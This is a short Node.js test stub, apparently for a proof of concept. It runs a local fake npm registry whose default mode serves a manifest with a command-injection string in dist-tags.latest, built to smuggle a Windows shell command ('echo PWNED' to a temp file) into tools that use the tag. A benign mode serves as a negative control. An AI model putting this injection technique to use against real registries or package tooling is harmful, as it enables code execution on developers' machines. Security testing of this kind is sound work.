// W1 E2E registry stub — serves the malicious dist-tags + valid manifest. Zero deps.
// Usage: node registry-server.cjs <port> [benign]
//   default: malicious dist-tags.latest = '1.0.0" & echo PWNED > %TEMP%\w1-poc & "'
//   'benign': dist-tags.latest = '1.0.0' (negative control)
const http = require('http');
const port = Number(process.argv[2] || 4873);
const benign = process.argv[3] === 'benign';
const MAL = '1.0.0" & echo PWNED > %TEMP%\\w1-poc & "';
const PKG = process.env.W1_TEST_PKG || 'w1-poc-pkg';
const packument = (tagValue) => ({
  name: PKG,
  'dist-tags': { latest: tagValue },
  versions: {
    '1.0.0': {
      name: PKG, version: '1.0.0',
      dist: { tarball: `http://127.0.0.1:${port}/${PKG}/-/${PKG}-1.0.0.tgz` },
    },
  },
});
http.createServer((req, res) => {
  const log = `${req.method} ${req.url}`;
  console.log('[REGISTRY]', log);
  // packument + any path: 200 packument for /<pkg>; 404 others (poisoned URL fails fast, marker already fired)
  if (req.url.split('?')[0] === '/' + PKG) {
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify(packument(benign ? '1.0.0' : MAL)));
  } else {
    res.statusCode = 404;
    res.end('{}');
  }
}).listen(port, '127.0.0.1', () => console.log(`[REGISTRY] listening on ${port} (mode: ${benign ? 'BENIGN' : 'MALICIOUS'})`));

